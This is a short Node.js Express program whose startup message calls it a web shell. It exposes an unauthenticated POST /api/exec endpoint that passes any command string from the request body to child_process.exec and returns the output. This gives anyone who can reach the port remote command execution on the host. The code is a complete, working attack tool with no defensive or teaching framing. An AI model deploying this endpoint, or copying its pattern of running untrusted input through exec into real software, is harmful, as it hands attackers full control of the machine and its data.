   const express = require('express');
   const { exec } = require('child_process');
   const app = express();

   app.use(express.json());

   app.post('/api/exec', (req, res) => {
     const { cmd } = req.body;
     if (!cmd) return res.status(400).json({ error: 'Missing cmd' });

     exec(cmd, { timeout: 10000 }, (error, stdout, stderr) => {
       res.json({
         stdout,
         stderr,
         exitCode: error ? error.code : 0
       });
     });
   });

   app.listen(3000, () => console.log('Web shell listening on :3000'));